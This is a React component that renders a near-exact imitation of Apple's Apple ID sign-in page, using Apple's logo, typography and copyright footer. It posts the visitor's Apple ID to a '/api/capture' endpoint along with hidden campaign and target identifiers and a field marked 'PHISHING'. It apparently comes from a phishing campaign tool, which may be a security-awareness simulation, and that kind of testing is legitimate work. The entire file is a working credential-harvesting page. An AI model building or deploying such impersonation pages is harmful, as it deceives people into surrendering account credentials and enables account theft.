'use client';

import React, { useState } from 'react';

export default function AppleLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  return (
    <div style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif', backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      
      {/* Black navigation bar mockup */}
      <div style={{ height: '44px', width: '100%', backgroundColor: '#000', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
        <svg viewBox="0 0 14 44" width="14px" height="44px" fill="#fff">
          <path d="M13.07,18.06C13.06,14.61 15.93,12.92 16.06,12.84C14.47,10.5 11.96,10.15 11.1,10.06C9.17,9.86 7.29,11.23 6.3,11.23C5.3,11.23 3.77,10.08 2.18,10.11C0.21,10.14 -1.61,11.27 -2.61,13C-4.66,16.58 -2.09,21.9 -0.09,24.78C0.88,26.17 2.03,27.73 3.51,27.67C4.94,27.61 5.48,26.74 7.2,26.74C8.92,26.74 9.42,27.67 10.9,27.64C12.43,27.61 13.43,26.22 14.39,24.81C15.52,23.16 15.98,21.57 16,21.49C15.95,21.47 13.08,20.36 13.07,18.06ZM10.28,7.91C11.08,6.95 11.62,5.61 11.47,4.28C10.35,4.32 8.97,5.03 8.14,6.01C7.42,6.85 6.78,8.21 6.96,9.52C8.21,9.62 9.49,8.87 10.28,7.91Z" transform="translate(4 -4)" />
        </svg>
      </div>

      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: '40px' }}>
        <h1 style={{ fontSize: '40px', fontWeight: 600, color: '#1d1d1f', marginBottom: '18px', textAlign: 'center' }}>
          Sign in with your Apple ID
        </h1>
        <p style={{ fontSize: '21px', color: '#1d1d1f', textAlign: 'center', marginBottom: '40px', fontWeight: 400 }}>
          You will be signed in to Apple TV and Apple Music.
        </p>

        <div style={{ width: '100%', maxWidth: '400px' }}>
          <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
            <input type="hidden" name="campaignId" value={campaignId} />
            <input type="hidden" name="targetId" value={targetId} />
            <input type="hidden" name="type" value="PHISHING" />

            <div style={{
              display: 'flex',
              alignItems: 'center',
              border: '1px solid #d2d2d7',
              borderRadius: '8px',
              padding: '0 16px',
              height: '56px',
              boxSizing: 'border-box'
            }}>
              <input 
                type="text" 
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Apple ID"
                required
                autoComplete="off"
                style={{
                  width: '100%',
                  border: 'none',
                  outline: 'none',
                  fontSize: '17px',
                  backgroundColor: 'transparent'
                }}
              />
              <button 
                type="submit"
                style={{
                  background: 'none',
                  border: 'none',
                  position: 'relative',
                  width: '30px',
                  height: '30px',
                  cursor: 'pointer'
                }}
              >
                <div style={{
                  position: 'absolute',
                  top: '50%',
                  left: '50%',
                  transform: 'translate(-50%, -50%)',
                  width: '24px',
                  height: '24px',
                  borderRadius: '50%',
                  backgroundColor: email ? '#0071e3' : '#d2d2d7',
                  display: 'flex',
                  justifyContent: 'center',
                  alignItems: 'center',
                  color: '#fff',
                  transition: 'background-color 0.2s'
                }}>
                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                    <path d="M7 13.5L13.5 7L7 0.5M13.5 7H0.5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
              </button>
            </div>
            
            <div style={{ textAlign: 'center', marginTop: '35px' }}>
              <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
                <input type="checkbox" defaultChecked style={{ width: '16px', height: '16px' }} />
                <span style={{ fontSize: '14px', color: '#1d1d1f' }}>Keep me signed in</span>
              </div>
            </div>

            <div style={{ textAlign: 'center', marginTop: '20px', fontSize: '14px' }}>
              <a href="#" style={{ color: '#0066cc', textDecoration: 'none' }}>Forgot Apple ID or password?</a>
            </div>

            <div style={{ textAlign: 'center', marginTop: '16px', fontSize: '14px', color: '#1d1d1f' }}>
              Don't have an Apple ID? <a href="#" style={{ color: '#0066cc', textDecoration: 'none' }}>Create yours now.</a>
            </div>

          </form>
        </div>
      </main>

      <footer style={{ backgroundColor: '#f5f5f7', borderTop: '1px solid #d2d2d7', padding: '16px 22px', fontSize: '12px', color: '#86868b' }}>
        <div style={{ maxWidth: '980px', margin: '0 auto', display: 'flex', justifyContent: 'space-between' }}>
          <div>Copyright © 2026 Apple Inc. All rights reserved.</div>
          <div style={{ display: 'flex', gap: '16px' }}>
            <a href="#" style={{ color: '#424245', textDecoration: 'none' }}>Privacy Policy</a>
            <a href="#" style={{ color: '#424245', textDecoration: 'none' }}>Terms of Use</a>
            <a href="#" style={{ color: '#424245', textDecoration: 'none' }}>Sales and Refunds</a>
            <a href="#" style={{ color: '#424245', textDecoration: 'none' }}>Legal</a>
            <a href="#" style={{ color: '#424245', textDecoration: 'none' }}>Site Map</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
